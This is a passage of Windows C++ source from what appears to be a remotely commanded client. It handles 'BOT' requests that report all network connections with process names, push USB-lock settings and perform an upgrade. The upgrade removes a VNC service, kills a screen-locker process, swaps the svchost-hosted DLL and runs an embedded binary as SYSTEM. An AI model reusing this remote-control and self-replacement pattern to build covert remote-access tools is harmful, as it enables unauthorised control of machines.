		NetworkConnectInfo *pTcpInfo = GetTcpInfo(iTcpCount);
		for (i = 0; i < iTcpCount; i++)
		{
			if (iIndex)
				strResponse += _T("|");
			LPTSTR pszInfo = new TCHAR[2048];
			wsprintf(pszInfo, _T("TCP/%s:%d/%s:%d/%s/%d/%s/"),
				pTcpInfo[i].szLocalAddr, pTcpInfo[i].uLocalPort,
				pTcpInfo[i].szRemoteAddr, pTcpInfo[i].uRemotePort,
				pTcpInfo[i].szProcessName, pTcpInfo[i].dwPid,
				pTcpInfo[i].szStat);
			strResponse += pszInfo;
			delete[] pszInfo;
			iIndex++;
		}
		SAFE_DELETE_AR(pTcpInfo);
		// UDP
		int iUdpCount = 0;
		NetworkConnectInfo *pUdpInfo = GetUdpInfo(iUdpCount);
		for (i = 0; i < iUdpCount; i++)
		{
			if (iIndex)
				strResponse += _T("|");
			LPTSTR pszInfo = new TCHAR[2048];
			wsprintf(pszInfo, _T("UDP/%s:%d/%s:%d/%s/%d/%s/"),
				pUdpInfo[i].szLocalAddr, pUdpInfo[i].uLocalPort,
				pUdpInfo[i].szRemoteAddr, pUdpInfo[i].uRemotePort,
				pUdpInfo[i].szProcessName, pUdpInfo[i].dwPid,
				pUdpInfo[i].szStat);
			strResponse += pszInfo;
			delete[] pszInfo;
			iIndex++;
		}
		SAFE_DELETE_AR(pUdpInfo);
		lRet = RESPONSE_RET_SUCCESS;
	}
	else if (BOT_TYPE_USB_CONFIG == Req.dwType)
	{
		std::string strRequest = CT2A((LPTSTR)(LPCTSTR)Req.szRequest);
		BOOL bParsed = m_LockerInfo->LoadConfig(strRequest.c_str());
		if (bParsed)
		{
			Json::Value jsonItem;
			jsonItem["Type"]	= PIPE_TYPE_USB;
			jsonItem["Content"]	= strRequest;
			Json::FastWriter writer;
			std::string strPipeContent = writer.write(jsonItem);
			PipeClient client;
			NamedPipe *pPipe = client.Connect(PIPE_NAME);
			if (NULL != pPipe)
			{
				pPipe->Write(strPipeContent.c_str(), strPipeContent.size());
				NamedPipe::Push(pPipe);
				strResponse = _T("更新配置成功");
				lRet = RESPONSE_RET_SUCCESS;
			}
			else
			{
				strResponse = _T("更新配置失败!(PIPE失败)");
				lRet = RESPONSE_RET_FAILED;
			}
		}
		else
		{
			strResponse = _T("更新配置失败!");
			lRet = RESPONSE_RET_FAILED;
		}		
	}
	else if (BOT_TYPE_UPGRADE == Req.dwType)
	{
		// VNC
		CSvchostServiceModule::Control(_T("tvnserver"), FALSE);
		BOOL bOpRet = FALSE;
		DWORD dwTime = 0;
		while (TRUE)
		{
			BOOL bRunning = CSvchostServiceModule::IsRunning(_T("tvnserver"));
			if (!bRunning)
			{
				bOpRet = TRUE;
				break;
			}

			dwTime++;
			Sleep(200);
			if (dwTime >= 50)
			{
				break;
			}
		}
		if (!bOpRet)
		{
			strResponse = _T("关闭VNC失败!");
			lRet = RESPONSE_RET_FAILED;
		}
		else
		{
			CSvchostServiceModule::Uninstall(_T("tvnserver"), _T("MacMan"));
			// Screen
			m_bCheckScreenLocker = FALSE;
			bOpRet = FALSE;
			dwTime = 0;
			while (TRUE)
			{
				BOOL bFound = FALSE;
				const LPCTSTR TASK_EXE = _T("ScreenLocker.exe");
				PROCESSENTRY32 pe32 = {0};
				HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    
				if (hProcessSnap != (HANDLE)-1)    
				{
					pe32.dwSize = sizeof(PROCESSENTRY32);    
					if (Process32First(hProcessSnap, &pe32))    
					{  
						while(1)  
						{
							if (0 == _tcsicmp(pe32.szExeFile, TASK_EXE))
							{
								bFound = TRUE;
								HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
								if (hProc != 0)
								{
									TerminateProcess(hProc, -1);
								}
							}

							if (!Process32Next(hProcessSnap, &pe32))
							{
								break;
							}
						}
					}
					CloseHandle(hProcessSnap);
				}
				if (!bFound)
				{
					bOpRet = TRUE;
					break;
				}
				dwTime++;
				Sleep(200);
				if (dwTime >= 50)
				{
					break;
				}
			}
			if (!bOpRet)
			{
				strResponse = _T("关闭ScreenLocker失败!");
				lRet = RESPONSE_RET_FAILED;
			}
			else
			{
				TCHAR szDllPath[MAX_PATH] = {0};
				CSvchostServiceModule::GetDllPath(szDllPath, SERVICE_DLL_FILE_NAME, GetCurrentProcessId());
				TCHAR szDllNewPath[MAX_PATH];
				lstrcpy(szDllNewPath, szDllPath);
				lstrcat(szDllNewPath, _T(".UP"));
				TCHAR szTmpPath[MAX_PATH];
				lstrcpy(szTmpPath, szDllPath);
				lstrcat(szTmpPath, _T(".TMP"));
				DeleteFile(szTmpPath);
				BOOL bRet = MoveFile(szDllPath, szTmpPath);
				bRet = bRet && MoveFile(szDllNewPath, szDllPath);
				if (!bRet)
				{
					CString strTmp;
					strTmp.Format(_T("更新文件失败(重命名)[%d]!"), GetLastError());
					strResponse = strTmp;
					lRet = RESPONSE_RET_FAILED;
					DeleteFile(szDllNewPath);
					MoveFile(szTmpPath, szDllPath);
				}
				else
				{
					BOOL bExtract = SystemUtils::Extractfile(
						m_hInstance,
						MAKEINTRESOURCE(IDR_BIN_UPGRADE), _T("BIN"), m_szUpgradePath);
					if (!bExtract)
					{
						CString strTmp;
						strTmp.Format(_T("释放更新文件失败[%d]!"), GetLastError());
						strResponse = strTmp;
						lRet = RESPONSE_RET_FAILED;
					}
					else
					{
						SystemUtils::CreateNormalProcessInSystem(m_szUpgradePath, TRUE, TRUE, FALSE);
						strResponse = _T("开始重启客户端");
						lRet = RESPONSE_RET_SUCCESS;
					}
				}
			}
		}
	}
	return lRet;
}

BOOL CSafeProcess::Test()
{
	/*
	BinStorage::InitKey(theInfo.szKey);
	BinStorage::STORAGE *binStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	// Update Status
	bRet = bRet && BinStorage::AddItem(&binStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_MANAGE_GET_LIST);
	if (FALSE == bRet)
		return FALSE;

	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(binStorage);
	if (pResStorage)
	{
		BinStorage::ITEM *pItem = NULL;
		while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
		{
			LPTSTR pText = BinStorage::GetItemText(pItem);
			delete[] pText;
		}
	}

	SAFE_DELETE(binStorage);
	return bRet;
	*/
	return TRUE;
}
